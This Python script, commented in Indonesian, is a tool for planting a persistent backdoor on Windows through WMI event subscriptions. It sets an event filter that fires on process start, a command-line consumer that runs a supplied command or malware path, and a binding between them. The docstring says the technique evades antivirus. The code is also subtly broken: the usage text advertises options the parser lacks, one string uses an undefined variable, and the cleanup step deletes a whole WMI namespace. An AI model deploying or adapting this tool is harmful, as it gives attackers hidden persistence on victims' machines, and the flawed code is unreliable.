#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
wmi_event.py - Persistent WMI Event Subscription for Windows

Membuat persistent backdoor/subskripsi menggunakan WMI Event Consumer.
Teknik ini menyembunyikan eksekusi di balik event log sistem Windows,
sehingga sulit dideteksi oleh antivirus konvensional.

Cara Penggunaan:
    python wmi_event.py --command "notepad.exe"
    python wmi_event.py --payload "C:\path\to\malware.exe"
    python wmi_event.py --script "C:\scripts\run.bat"

Author: Dwi Joko Purwanto 
Version: 1.0.0
"""

import subprocess
import sys
import os
import argparse
import platform
import time


def run_command(cmd, check=True):
    """
    Menjalankan command shell dan mengembalikan hasil.
    """
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        if check and result.returncode != 0:
            print(f"[!] Error executing: {cmd}")
            print(f"    Stderr: {result.stderr.strip()}")
            return False
        return True
    except Exception as e:
        print(f"[!] Exception: {e}")
        return False


def clean_existing_subscriptions():
    """
    Membersihkan semua subscription WMI persisten yang sudah ada
    untuk mencegah konflik dan duplikasi.
    """
    print("[*] Membersihkan subscription WMI lama...")
    
    # Hapus filter yang ada
    filters = [
        "Root\\Subscription:Win32_ExtensionConsumerFilter",
        "Root\\Subscription:CommandLineEventConsumer"
    ]
    
    for cls in filters:
        run_command(f'wmic namespace where "name=\'Root\\\\Subscription\'" delete', check=False)
        
    # Cara lebih spesifik dengan PowerShell jika wmci gagal
    ps_clean = """
    Get-WmiObject -Namespace "Root\\Subscription" -Class "__Filter" | Remove-WmiObject -ErrorAction SilentlyContinue;
    Get-WmiObject -Namespace "Root\\Subscription" -Class "CommandLineEventConsumer" | Remove-WmiObject -ErrorAction SilentlyContinue;
    Get-WmiObject -Namespace "Root\\Subscription" -Class "__EventFilter" | Remove-WmiObject -ErrorAction SilentlyContinue;
    """
    run_command(f'powershell -ExecutionPolicy Bypass -Command "{ps_clean}"')
    print("[+] Bersih.")


def create_wmi_subscription(command):
    """
    Membuat subscription WMI persisten.
    Menggunakan Win32_ProcessStartTrace sebagai trigger.
    """
    print("[*] Membuat namespace Root\\Subscription jika belum ada...")
    run_command('wmic namespace list', check=False) # Cek apakah wmic berjalan
    
    # Langkah 1: Buat Filter Event
    # Filter ini akan memicu setiap kali proses baru dimulai
    filter_name = "MyPersistentFilter"
    query = "SELECT * FROM Win32_ProcessStartTrace"
    
    print("[*] Membuat Event Filter...")
    # Kita gunakan PowerShell karena lebih reliable daripada WMIC untuk pembuatan objek kompleks
    ps_script = f'''
    $namespace = "ROOT\\Subscription"
    $class = "__EventFilter"
    $filterName = "{filter_name}"
    
    # Cek apakah sudah ada, hapus jika ada
    $existing = Get-WmiObject -Namespace $namespace -Class $class -Filter "Name='{filter_name}'" -ErrorAction SilentlyContinue
    if ($existing) {{
        $existing.PSBase.Delete()
    }}
    
    # Buat filter baru
    $filter = Set-WmiInstance -Namespace $namespace -Class $class -Arguments @{{
        Name = "{filter_name}"
        EventNameSpace = "root\\cimv2"
        QueryLanguage = "WQL"
        Query = "{query}"
    }}
    Write-Host "[+] Filter dibuat: {filter_name}"
    '''
    run_command(f'powershell -ExecutionPolicy Bypass -Command "{ps_script}"')

    # Langkah 2: Buat Consumer (Command Line Consumer)
    consumer_name = "MyPersistentConsumer"
    print("[*] Membuat Event Consumer...")
    
    ps_consumer = f'''
    $namespace = "ROOT\\Subscription"
    $class = "CommandLineEventConsumer"
    $consumerName = "{consumer_name}"
    
    # Hapus jika ada
    $existing = Get-WmiObject -Namespace $namespace -Class $class -Filter "Name='{consumerName}'" -ErrorAction SilentlyContinue
    if ($existing) {{
        $existing.PSBase.Delete()
    }}
    
    # Buat consumer
    $consumer = Set-WmiInstance -Namespace $namespace -Class $class -Arguments @{{
        Name = "{consumer_name}"
        CommandLine = "{command}"
        WorkingDirectory = "C:\\Windows\\System32"
    }}
    Write-Host "[+] Consumer dibuat: {consumer_name}"
    '''
    run_command(f'powershell -ExecutionPolicy Bypass -Command "{ps_consumer}"')

    # Langkah 3: Bind Filter ke Consumer
    print("[*] Mengaitkan Filter dengan Consumer...")
    ps_bind = f'''
    $namespace = "ROOT\\Subscription"
    $filter = Get-WmiObject -Namespace $namespace -Class "__EventFilter" -Filter "Name='{filter_name}'"
    $consumer = Get-WmiObject -Namespace $namespace -Class "CommandLineEventConsumer" -Filter "Name='{consumer_name}'"
    
    # Buat binding
    $binding = Set-WmiInstance -Namespace $namespace -Class "__FilterToConsumerBinding" -Arguments @{{
        Filter = $filter
        Consumer = $consumer
    }}
    Write-Host "[+] Binding berhasil dibuat."
    '''
    run_command(f'powershell -ExecutionPolicy Bypass -Command "{ps_bind}"')

    print("[+] Semua langkah selesai. Subskripsi WMI aktif.")


def verify_subscription():
    """
    Verifikasi bahwa subscription benar-benar terdaftar.
    """
    print("[*] Memverifikasi subscription...")
    ps_verify = '''
    $filters = Get-WmiObject -Namespace "ROOT\\Subscription" -Class "__EventFilter"
    $consumers = Get-WmiObject -Namespace "ROOT\\Subscription" -Class "CommandLineEventConsumer"
    $bindings = Get-WmiObject -Namespace "ROOT\\Subscription" -Class "__FilterToConsumerBinding"
    
    Write-Host "--- Status ---"
    Write-Host "Filters: $($filters.Count)"
    Write-Host "Consumers: $($consumers.Count)"
    Write-Host "Bindings: $($bindings.Count)"
    '''
    run_command(f'powershell -ExecutionPolicy Bypass -Command "{ps_verify}"')


def main():
    parser = argparse.ArgumentParser(description="Buat Persistent WMI Event Subscription")
    parser.add_argument("--command", "-c", type=str, required=True, 
                        help="Perintah yang akan dijalankan saat event terjadi (misal: 'notepad.exe' atau 'C:\\payload.exe')")
    parser.add_argument("--clean-only", action="store_true", 
                        help="Hanya bersihkan subscription lama, jangan buat baru")
    args = parser.parse_args()

    # Pastikan dijalankan di Windows
    if platform.system() != "Windows":
        print("[!] Script ini harus dijalankan di lingkungan Windows.")
        sys.exit(1)

    # Jalankan
    try:
        if args.clean_only:
            clean_existing_subscriptions()
        else:
            clean_existing_subscriptions()
            create_wmi_subscription(args.command)
            verify_subscription()
            print("\n[+] Selesai. WMI Subscription Persisten Aktif.")
            print("    Catatan: Perubahan mungkin memerlukan waktu beberapa detik untuk berlaku.")
            
    except KeyboardInterrupt:
        print("\n[*] Dibatalkan oleh pengguna.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Terjadi kesalahan tak terduga: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
